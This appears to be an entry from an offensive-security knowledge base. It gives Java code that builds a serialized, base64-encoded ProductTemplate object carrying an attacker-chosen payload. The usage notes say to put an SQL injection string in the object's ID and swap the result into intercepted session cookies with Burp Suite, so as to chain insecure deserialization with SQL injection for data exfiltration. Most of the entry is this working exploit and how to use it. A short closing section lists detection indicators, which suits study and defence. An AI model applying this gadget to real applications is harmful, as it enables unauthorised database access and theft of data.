---
id: 68c2ff52-f4ce-493f-adec-4ad98e817732
type: code
language: Java
verified: true
created_at: '2020-08-25T18:29:54.256094+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - '[[tags/Insecure Deserialisation]]'
  - '[[tags/java]]'
  - '[[tags/SQL Injection]]'
validated: true
---

# Java-Custom-Gadget-Serializer-for-ProductTemplate

## Code

```java
import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("your-payload-here");

        String serializedObject = serialize(originalObject);

        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);

        System.out.println("Deserialized object ID: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

## Description

This Java code creates a custom serialization gadget for exploiting insecure deserialization in applications using the ProductTemplate class. It instantiates a ProductTemplate object with a specified payload (e.g., SQL injection string) in the ID field, serializes it to a byte array, base64-encodes it for HTTP transmission, and includes a deserialization function for verification. The serialized output can be injected into session cookies or other deserialization points to manipulate application logic, such as injecting SQL payloads that execute during object processing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "your-payload-here" | The string payload to set as the ProductTemplate ID (e.g., SQL injection like "' UNION SELECT ...") | "'" |

## Usage

Compile with `javac Main.java` and run with `java Main` after modifying the payload in the `new ProductTemplate(...)` line. Use the output base64 string to replace values in intercepted HTTP cookies via Burp Suite. This is used in the [[procedures/Exploit-Java-Insecure-Deserialization-via-Custom-Gadget-for-SQL-Injection]] procedure to chain deserialization with SQL injection for data exfiltration.

## Detection

- Application logs showing deserialization exceptions or SQL syntax errors.
- Anomalous base64 strings in session cookies that decode to unexpected Java objects.
- Network traffic analysis for large, non-standard cookie values.
- Static analysis of application code for unsafe ObjectInputStream usage without class whitelisting.
